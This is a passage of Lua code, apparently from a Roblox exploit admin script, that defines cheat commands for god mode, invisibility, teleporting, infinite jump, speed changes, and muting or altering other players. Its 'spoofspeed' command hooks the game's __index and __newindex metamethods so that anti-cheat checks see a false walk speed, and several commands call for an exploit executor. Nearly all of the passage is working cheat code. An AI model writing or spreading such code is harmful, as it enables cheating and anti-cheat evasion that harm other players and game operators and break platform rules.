	addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				task.spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x.Name ~= floatName and x:IsA("BasePart") and x.Anchored then
							x.Anchored = false
						end
					end
				end)
			end
		end
	end)

	oofing = false
	addcmd('loopoof',{},function(args, speaker)
		oofing = true
		repeat wait(0.1)
			for i,v in pairs(Players:GetPlayers()) do
				if v.Character ~= nil and v.Character:FindFirstChild'Head' then
					for _,x in pairs(v.Character.Head:GetChildren()) do
						if x:IsA'Sound' then x.Playing = true end
					end
				end
			end
		until oofing == false
	end)

	addcmd('unloopoof',{},function(args, speaker)
		oofing = false
	end)

	local notifiedRespectFiltering = false
	addcmd('muteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				task.spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
					for i, x in next, Players[v]:FindFirstChildOfClass("Backpack"):GetDescendants() do
						if x:IsA("Sound") and x.Playing == true then
							x.Playing = false
						end
					end
				end)
			end
		end
	end)

	addcmd('unmuteboombox',{},function(args, speaker)
		if not notifiedRespectFiltering and SoundService.RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
		local players = getPlayer(args[1], speaker)
		if players ~= nil then
			for i,v in pairs(players) do
				task.spawn(function()
					for i, x in next, Players[v].Character:GetDescendants() do
						if x:IsA("Sound") and x.Playing == false then
							x.Playing = true
						end
					end
				end)
			end
		end
	end)

	addcmd('reset',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
	end)

	addcmd('freezeanims',{},function(args, speaker)
		local Humanoid = speaker.Character:FindFirstChildOfClass("Humanoid") or speaker.Character:FindFirstChildOfClass("AnimationController")
		local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
		for _, v in pairs(ActiveTracks) do
			v:AdjustSpeed(0)
		end
	end)

	addcmd('unfreezeanims',{},function(args, speaker)
		local Humanoid = speaker.Character:FindFirstChildOfClass("Humanoid") or speaker.Character:FindFirstChildOfClass("AnimationController")
		local ActiveTracks = Humanoid:GetPlayingAnimationTracks()
		for _, v in pairs(ActiveTracks) do
			v:AdjustSpeed(1)
		end
	end)




	addcmd('respawn',{},function(args, speaker)
		respawn(speaker)
	end)

	addcmd('refresh',{'re'},function(args, speaker)
		refresh(speaker)
	end)

	addcmd('god',{},function(args, speaker)
		local Cam = workspace.CurrentCamera
		local Pos, Char = Cam.CFrame, speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		local nHuman = Human.Clone(Human)
		nHuman.Parent, speaker.Character = Char, nil
		nHuman.SetStateEnabled(nHuman, 15, false)
		nHuman.SetStateEnabled(nHuman, 1, false)
		nHuman.SetStateEnabled(nHuman, 0, false)
		nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
		speaker.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, wait() and Pos
		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
		local Script = Char.FindFirstChild(Char, "Animate")
		if Script then
			Script.Disabled = true
			wait()
			Script.Disabled = false
		end
		nHuman.Health = nHuman.MaxHealth
	end)

	invisRunning = false
	addcmd('invisible',{'invis'},function(args, speaker)
		if invisRunning then return end
		invisRunning = true
		-- Full credit to AmokahFox @V3rmillion
		local Player = speaker
		repeat wait(.1) until Player.Character
		local Character = Player.Character
		Character.Archivable = true
		local IsInvis = false
		local IsRunning = true
		local InvisibleCharacter = Character:Clone()
		InvisibleCharacter.Parent = Lighting
		local Void = workspace.FallenPartsDestroyHeight
		InvisibleCharacter.Name = ""
		local CF

		local invisFix = RunService.Stepped:Connect(function()
			pcall(function()
				local IsInteger
				if tostring(Void):find'-' then
					IsInteger = true
				else
					IsInteger = false
				end
				local Pos = Player.Character.HumanoidRootPart.Position
				local Pos_String = tostring(Pos)
				local Pos_Seperate = Pos_String:split(', ')
				local X = tonumber(Pos_Seperate[1])
				local Y = tonumber(Pos_Seperate[2])
				local Z = tonumber(Pos_Seperate[3])
				if IsInteger == true then
					if Y <= Void then
						Respawn()
					end
				elseif IsInteger == false then
					if Y >= Void then
						Respawn()
					end
				end
			end)
		end)

		for i,v in pairs(InvisibleCharacter:GetDescendants())do
			if v:IsA("BasePart") then
				if v.Name == "HumanoidRootPart" then
					v.Transparency = 1
				else
					v.Transparency = .5
				end
			end
		end

		function Respawn()
			IsRunning = false
			if IsInvis == true then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					IsInvis = false
					InvisibleCharacter.Parent = nil
					invisRunning = false
				end)
			elseif IsInvis == false then
				pcall(function()
					Player.Character = Character
					wait()
					Character.Parent = workspace
					Character:FindFirstChildWhichIsA'Humanoid':Destroy()
					TurnVisible()
				end)
			end
		end

		local invisDied
		invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)

		if IsInvis == true then return end
		IsInvis = true
		CF = workspace.CurrentCamera.CFrame
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
		workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
		wait(.2)
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
		InvisibleCharacter = InvisibleCharacter
		Character.Parent = Lighting
		InvisibleCharacter.Parent = workspace
		InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
		Player.Character = InvisibleCharacter
		execCmd('fixcam')
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false

		function TurnVisible()
			if IsInvis == false then return end
			invisFix:Disconnect()
			invisDied:Disconnect()
			CF = workspace.CurrentCamera.CFrame
			Character = Character
			local CF_1 = Player.Character.HumanoidRootPart.CFrame
			Character.HumanoidRootPart.CFrame = CF_1
			InvisibleCharacter:Destroy()
			Player.Character = Character
			Character.Parent = workspace
			IsInvis = false
			Player.Character.Animate.Disabled = true
			Player.Character.Animate.Disabled = false
			invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
				Respawn()
				invisDied:Disconnect()
			end)
			invisRunning = false
		end
		notify('Invisible','You now appear invisible to other players')
	end)

	addcmd('visible',{'vis'},function(args, speaker)
		TurnVisible()
	end)

	addcmd('toggleinvis',{},function(args, speaker)
		if invisRunning then
			execCmd('visible')
		else
			execCmd('invisible')
		end
	end)

	addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
		local Char  = Players.LocalPlayer.Character
		local touched = false
		local tpdback = false
		local box = Instance.new('Part')
		box.Anchored = true
		box.CanCollide = true
		box.Size = Vector3.new(10,1,10)
		box.Position = Vector3.new(0,10000,0)
		box.Parent = workspace
		local boxTouched = box.Touched:connect(function(part)
			if (part.Parent.Name == Players.LocalPlayer.Name) then
				if touched == false then
					touched = true
					local function apply()
						local no = Char.HumanoidRootPart:Clone()
						wait(.25)
						Char.HumanoidRootPart:Destroy()
						no.Parent = Char
						Char:MoveTo(loc)
						touched = false
					end
					if Char then
						apply()
					end
				end
			end
		end)
		repeat wait() until Char
		local cleanUp
		cleanUp = Players.LocalPlayer.CharacterAdded:connect(function(char)
			boxTouched:Disconnect()
			box:Destroy()
			cleanUp:Disconnect()
		end)
		loc = Char.HumanoidRootPart.Position
		Char:MoveTo(box.Position + Vector3.new(0,.5,0))
	end)

	addcmd('strengthen',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('weaken',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				if args[1] then
					child.CustomPhysicalProperties = PhysicalProperties.new(-args[1], 0.3, 0.5)
				else
					child.CustomPhysicalProperties = PhysicalProperties.new(0, 0.3, 0.5)
				end
			end
		end
	end)

	addcmd('unweaken',{'unstrengthen'},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child.ClassName == "Part" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('breakvelocity', {}, function(args, speaker)
		local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
		delay(1, function()
			BeenASecond = true
		end)
		while not BeenASecond do
			for _, v in ipairs(speaker.Character:GetDescendants()) do
				if v.IsA(v, "BasePart") then
					v.Velocity, v.RotVelocity = V3, V3
				end
			end
			wait()
		end
	end)

	addcmd('jpower',{'jumppower','jp'},function(args, speaker)
		local jpower = args[1] or 50
		if isNumber(jpower) then
			if speaker.Character:FindFirstChildOfClass('Humanoid').UseJumpPower then
				speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
			else
				speaker.Character:FindFirstChildOfClass('Humanoid').JumpHeight  = jpower
			end
		end
	end)

	addcmd('maxslopeangle',{'msa'},function(args, speaker)
		local sangle = args[1] or 89
		if isNumber(sangle) then
			speaker.Character:FindFirstChildOfClass('Humanoid').MaxSlopeAngle = sangle
		end
	end)

	addcmd('gravity',{'grav'},function(args, speaker)
		local grav = args[1] or 196.2
		if isNumber(grav) then
			workspace.Gravity = grav
		end
	end)

	addcmd('hipheight',{'hheight'},function(args, speaker)
		speaker.Character:FindFirstChildWhichIsA('Humanoid').HipHeight = args[1] or (r15(speaker) and 2.1 or 0)
	end)

	addcmd("dance", {}, function(args, speaker)
		pcall(execCmd, "undance")
		local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
		if r15(speaker) then
			dances = {"3333432454", "4555808220", "4049037604", "4555782893", "10214311282", "10714010337", "10713981723", "10714372526", "10714076981", "10714392151", "11444443576"}
		end
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
		danceTrack = speaker.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
		danceTrack.Looped = true
		danceTrack:Play()
	end)

	addcmd("undance", {"nodance"}, function(args, speaker)
		danceTrack:Stop()
		danceTrack:Destroy()
	end)

	addcmd('nolimbs',{'rlimbs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" or
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" or
					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nohead',{'rhead','headless'},function(args, speaker)
		if sethidden then
			-- Full credit to Thomas_Cornez#0272 @Discord
			local lplr = Players.LocalPlayer
			local char = lplr.Character
			local rigType = tostring(char:FindFirstChildOfClass('Humanoid').RigType) == "Enum.HumanoidRigType.R6" and 1 or tostring(char:FindFirstChildOfClass('Humanoid').RigType) == "Enum.HumanoidRigType.R15" and 2

			local speaker = Players.LocalPlayer


			local test = Instance.new("Model")
			local hum  = Instance.new("Humanoid")
			local animation = Instance.new("Model")
			local humanoidanimation = Instance.new("Humanoid")
			test.Parent = workspace
			hum.Parent = test
			animation.Parent = workspace
			humanoidanimation.Parent = animation

			lplr.Character = test
			wait(2)
			char:FindFirstChildOfClass('Humanoid').Animator.Parent = humanoidanimation
			char:FindFirstChildOfClass('Humanoid'):Destroy()

			char.Head:Destroy()
			wait(5)
			Players.LocalPlayer.Character = char

			local hum2 = Instance.new("Humanoid")
			hum2.Parent = char
			char:FindFirstChildOfClass("Humanoid").Jump = true

			humanoidanimation.Animator.Parent = hum2
			char.Animate.Disabled = true
			wait()
			char.Animate.Disabled = false
			wait()

			if rig == 1 then
				hum2.HipHeight = 0
			elseif rig == 2 then
				hum2.HipHeight = 2.19
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('noarms',{'rarms'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperArm" or
					v.Name == "LeftUpperArm" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Arm" or
					v.Name == "Left Arm" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd('nolegs',{'rlegs'},function(args, speaker)
		if r15(speaker) then
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "RightUpperLeg" or
					v.Name == "LeftUpperLeg" then
					v:Destroy()
				end
			end
		else
			for i,v in pairs(speaker.Character:GetChildren()) do
				if v:IsA("BasePart") and
					v.Name == "Right Leg" or
					v.Name == "Left Leg" then
					v:Destroy()
				end
			end
		end
	end)

	addcmd("sit", {}, function(args, speaker)
		speaker.Character:FindFirstChildWhichIsA("Humanoid").Sit = true
	end)

	addcmd("lay", {"laydown"}, function(args, speaker)
		local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
		humanoid.Sit = true
		task.wait(0.1)
		humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
		for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
			v:Stop()
		end
	end)

	addcmd("sitwalk", {}, function(args, speaker)
		local anims = speaker.Character.Animate
		local sit = anims.sit:FindFirstChildWhichIsA("Animation").AnimationId
		anims.idle:FindFirstChildWhichIsA("Animation").AnimationId = sit
		anims.walk:FindFirstChildWhichIsA("Animation").AnimationId = sit
		anims.run:FindFirstChildWhichIsA("Animation").AnimationId = sit
		anims.jump:FindFirstChildWhichIsA("Animation").AnimationId = sit
		speaker.Character:FindFirstChildWhichIsA("Humanoid").HipHeight = not r15(speaker) and -1.5 or 0.5
	end)

	function noSitFunc()
		wait()
		if Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit then
			Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = false
		end
	end
	addcmd('nosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
		noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		local function nositDiedFunc()
			repeat wait() until speaker.Character ~= nil and speaker.Character:FindFirstChildOfClass("Humanoid")
			noSit:Disconnect()
			noSit = Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):GetPropertyChangedSignal("Sit"):Connect(noSitFunc)
		end
		nositDied = speaker.CharacterAdded:Connect(nositDiedFunc)
	end)

	addcmd('unnosit',{},function(args, speaker)
		if noSit then noSit:Disconnect() nositDied:Disconnect() end
	end)

	addcmd('jump',{},function(args, speaker)
		speaker.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
	end)

	local infJump
	local infJumpDebounce = false
	addcmd('infjump',{'infinitejump'},function(args, speaker)
		if infJump then infJump:Disconnect() end
		infJumpDebounce = false
		infJump = UserInputService.JumpRequest:Connect(function()
			if not infJumpDebounce then
				infJumpDebounce = true
				speaker.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
				wait()
				infJumpDebounce = false
			end
		end)
	end)

	addcmd('uninfjump',{'uninfinitejump','noinfjump','noinfinitejump'},function(args, speaker)
		if infJump then infJump:Disconnect() end
		infJumpDebounce = false
	end)

	local flyjump
	addcmd('flyjump',{},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
		flyjump = UserInputService.JumpRequest:Connect(function()
			speaker.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	end)

	addcmd('unflyjump',{'noflyjump'},function(args, speaker)
		if flyjump then flyjump:Disconnect() end
	end)

	local HumanModCons = {}
	addcmd('autojump',{'ajump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		local function autoJump()
			if Char and Human then
				local check1 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position-Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				local check2 = workspace:FindPartOnRay(Ray.new(Human.RootPart.Position+Vector3.new(0,1.5,0), Human.RootPart.CFrame.lookVector*3), Human.Parent)
				if check1 or check2 then
					Human.Jump = true
				end
			end
		end
		autoJump()
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or RunService.RenderStepped:Connect(autoJump)
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			autoJump()
			HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or RunService.RenderStepped:Connect(autoJump)
		end)
	end)

	addcmd('unautojump',{'noautojump', 'noajump', 'unajump'},function(args, speaker)
		HumanModCons.ajLoop = (HumanModCons.ajLoop and HumanModCons.ajLoop:Disconnect() and false) or nil
		HumanModCons.ajCA = (HumanModCons.ajCA and HumanModCons.ajCA:Disconnect() and false) or nil
	end)

	addcmd('edgejump',{'ejump'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
		-- Full credit to NoelGamer06 @V3rmillion
		local state
		local laststate
		local lastcf
		local function edgejump()
			if Char and Human then
				laststate = state
				state = Human:GetState()
				if laststate ~= state and state == Enum.HumanoidStateType.Freefall and laststate ~= Enum.HumanoidStateType.Jumping then
					Char.HumanoidRootPart.CFrame = lastcf
					Char.HumanoidRootPart.Velocity = Vector3.new(Char.HumanoidRootPart.Velocity.X, Human.JumpPower or Human.JumpHeight, Char.HumanoidRootPart.Velocity.Z)
				end
				lastcf = Char.HumanoidRootPart.CFrame
			end
		end
		edgejump()
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or RunService.RenderStepped:Connect(edgejump)
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or speaker.CharacterAdded:Connect(function(nChar)
			Char, Human = nChar, nChar:WaitForChild("Humanoid")
			edgejump()
			HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or RunService.RenderStepped:Connect(edgejump)
		end)
	end)

	addcmd('unedgejump',{'noedgejump', 'noejump', 'unejump'},function(args, speaker)
		HumanModCons.ejLoop = (HumanModCons.ejLoop and HumanModCons.ejLoop:Disconnect() and false) or nil
		HumanModCons.ejCA = (HumanModCons.ejCA and HumanModCons.ejCA:Disconnect() and false) or nil
	end)

	addcmd('team',{},function(args, speaker)
		local teamname = nil
		for a,b in pairs(Teams:GetChildren()) do
			local L_name = b.Name:lower()
			local F = L_name:find(getstring(1))
			if F == 1 then
				teamname = b 
			end
		end
		speaker.Team = teamname
	end)

	addcmd('nobgui',{'unbgui','nobillboardgui','unbillboardgui','noname','rohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
	end)

	addcmd('loopnobgui',{'loopunbgui','loopnobillboardgui','loopunbillboardgui','loopnoname','looprohg'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants())do
			if v:IsA("BillboardGui") or v:IsA("SurfaceGui") then
				v:Destroy()
			end
		end
		local function charPartAdded(part)
			if part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
				wait()
				part:Destroy()
			end
		end
		charPartTrigger = speaker.Character.DescendantAdded:Connect(charPartAdded)
	end)

	addcmd('unloopnobgui',{'unloopunbgui','unloopnobillboardgui','unloopunbillboardgui','unloopnoname','unlooprohg'},function(args, speaker)
		if charPartTrigger then
			charPartTrigger:Disconnect()
		end
	end)

	addcmd('spasm',{},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = "33796059"
			SpasmAnim = Instance.new("Animation")
			SpasmAnim.AnimationId = "rbxassetid://"..AnimationId
			Spasm = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(SpasmAnim)
			Spasm:Play()
			Spasm:AdjustSpeed(99)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('unspasm',{'nospasm'},function(args, speaker)
		Spasm:Stop()
		SpasmAnim:Destroy()
	end)

	addcmd('headthrow',{},function(args, speaker)
		if not r15(speaker) then
			local AnimationId = "35154961"
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
			k:Play(0)
			k:AdjustSpeed(1)
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('animation',{'anim'},function(args, speaker)
		if not r15(speaker) then
			local pchar=speaker.Character
			local AnimationId = tostring(args[1])
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..AnimationId
			local k = pchar:FindFirstChildOfClass('Humanoid'):LoadAnimation(Anim)
			k:Play()
			if args[2] then
				k:AdjustSpeed(tostring(args[2]))
			end
		else
			notify('R6 Required','This command requires the r6 rig type')
		end
	end)

	addcmd('noanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = true
	end)

	addcmd('reanim',{},function(args, speaker)
		speaker.Character.Animate.Disabled = false
	end)

	addcmd('animspeed',{},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:AdjustSpeed(tonumber(args[1] or 1))
		end
	end)

	addcmd('copyanimation',{'copyanim','copyemote'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for _,v in ipairs(players)do
			local char = Players[v].Character
			for _, v1 in pairs(speaker.Character:FindFirstChildOfClass('Humanoid'):GetPlayingAnimationTracks()) do
				v1:Stop()
			end
			for _, v1 in pairs(Players[v].Character:FindFirstChildOfClass('Humanoid'):GetPlayingAnimationTracks()) do
				if not string.find(v1.Animation.AnimationId, "507768375") then
					local ANIM = speaker.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(v1.Animation)
					ANIM:Play(.1, 1, v1.Speed)
					ANIM.TimePosition = v1.TimePosition
					task.spawn(function()
						v1.Stopped:Wait()
						ANIM:Stop()
						ANIM:Destroy()
					end)
				end
			end
		end
	end)

	addcmd('stopanimations',{'stopanims','stopanim'},function(args, speaker)
		local Char = speaker.Character
		local Hum = Char:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

		for i,v in next, Hum:GetPlayingAnimationTracks() do
			v:Stop()
		end
	end)

	addcmd('refreshanimations', {'refreshanimation', 'refreshanims', 'refreshanim'}, function(args, speaker)
		local Char = speaker.Character or speaker.CharacterAdded:Wait()
		local Human = Char and Char:WaitForChild('Humanoid', 15)
		local Animate = Char and Char:WaitForChild('Animate', 15)
		if not Human or not Animate then
			return notify('Refresh Animations', 'Failed to get Animate/Humanoid')
		end
		Animate.Disabled = true
		for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
			v:Stop()
		end
		Animate.Disabled = false
	end)

	addcmd('allowcustomanim', {'allowcustomanimations'}, function(args, speaker)
		StarterPlayer.AllowCustomAnimations = true
		execCmd('refreshanimations')
	end)

	addcmd('unallowcustomanim', {'unallowcustomanimations'}, function(args, speaker)
		StarterPlayer.AllowCustomAnimations = false
		execCmd('refreshanimations')
	end)

	addcmd('loopanimation', {'loopanim'},function(args, speaker)
		local Char = speaker.Character
		local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
		for _, v in ipairs(Human.GetPlayingAnimationTracks(Human)) do
			v.Looped = true
		end
	end)

	addcmd('tpposition',{'tppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			getRoot(char).CFrame = CFrame.new(tpX,tpY,tpZ)
		end
	end)

	addcmd('tweentpposition',{'ttppos'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('offset',{},function(args, speaker)
		if #args < 3 then
			return 
		end
		if speaker.Character then
			speaker.Character:TranslateBy(Vector3.new(tonumber(args[1]) or 0, tonumber(args[2]) or 0, tonumber(args[3]) or 0))
		end
	end)

	addcmd('tweenoffset',{'toffset'},function(args, speaker)
		if #args < 3 then return end
		local tpX,tpY,tpZ = tonumber(args[1]),tonumber(args[2]),tonumber(args[3])
		local char = speaker.Character
		if char and getRoot(char) then
			TweenService:Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(tpX,tpY,tpZ)}):Play()
		end
	end)

	addcmd('clickteleport',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click TP','Go to Settings>Keybinds>Add to set up click tp')
		end
	end)

	addcmd('tptool', {'teleporttool'}, function(args, speaker)
		local TpTool = Instance.new("Tool")
		TpTool.Name = "Teleport Tool"
		TpTool.RequiresHandle = false
		TpTool.Parent = speaker.Backpack
		TpTool.Activated:Connect(function()
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			if not Char or not HRP then
				return warn("Failed to find HumanoidRootPart")
			end
			HRP.CFrame = CFrame.new(IYMouse.Hit.X, IYMouse.Hit.Y + 3, IYMouse.Hit.Z, select(4, HRP.CFrame:components()))
		end)
	end)

	addcmd('clickdelete',{},function(args, speaker)
		if speaker == Players.LocalPlayer then
			notify('Click Delete','Go to Settings>Keybinds>Add to set up click delete')
		end
	end)

	addcmd('getposition',{'getpos','notifypos','notifyposition'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			notify('Current Position',roundedPos)
		end
	end)

	addcmd('copyposition',{'copypos'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			local char = Players[v].Character
			local pos = char and (getRoot(char) or char:FindFirstChildWhichIsA("BasePart"))
			pos = pos and pos.Position
			if not pos then
				return notify('Getposition Error','Missing character')
			end
			local roundedPos = math.round(pos.X) .. ", " .. math.round(pos.Y) .. ", " .. math.round(pos.Z)
			toClipboard(roundedPos)
		end
	end)

	addcmd('walktopos',{'walktoposition'},function(args, speaker)
		if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
			speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
			wait(.1)
		end
		speaker.Character:FindFirstChildOfClass('Humanoid').WalkToPoint = Vector3.new(args[1],args[2],args[3])
	end)

	addcmd('speed',{'ws','walkspeed'},function(args, speaker)
		if args[2] then
			local speed = args[2] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		else
			local speed = args[1] or 16
			if isNumber(speed) then
				speaker.Character:FindFirstChildOfClass('Humanoid').WalkSpeed = speed
			end
		end
	end)

	addcmd('spoofspeed',{'spoofws','spoofwalkspeed'},function(args, speaker)
		if args[1] and isNumber(args[1]) then
			if hookmetamethod then
				local char = speaker.Character
				local setspeed;
				local index; index = hookmetamethod(game, "__index", function(self, key)
					local keyclean = key:gsub("\0", "")
					if (keyclean == "WalkSpeed" or keyclean == "walkSpeed") and self:IsA("Humanoid") and self:IsDescendantOf(char) and not checkcaller() then
						return setspeed or args[1]
					end
					return index(self, key)
				end)
				local newindex; newindex = hookmetamethod(game, "__newindex", function(self, key, value)
					local keyclean = string.gsub(key, "\0", "")
					if (keyclean == "WalkSpeed" or keyclean == "walkSpeed") and self:IsA("Humanoid") and self:IsDescendantOf(char) and not checkcaller() then
						setspeed = tonumber(value)
						return setspeed
					end
					return newindex(self, key, value)
				end)
			else
				notify('Incompatible Exploit','Your exploit does not support this command (missing hookmetamethod)')
			end
		end
	end)

	addcmd('loopspeed',{'loopws'},function(args, speaker)
		local speed = args[1] or 16
		if args[2] then
			speed = args[2] or 16
		end
		if isNumber(speed) then
			local Char = speaker.Character or workspace:FindFirstChild(speaker.Name)
			local Human = Char and Char:FindFirstChildWhichIsA("Humanoid")
			local function WalkSpeedChange()
				if Char and Human then
					Human.WalkSpeed = speed
				end
			end
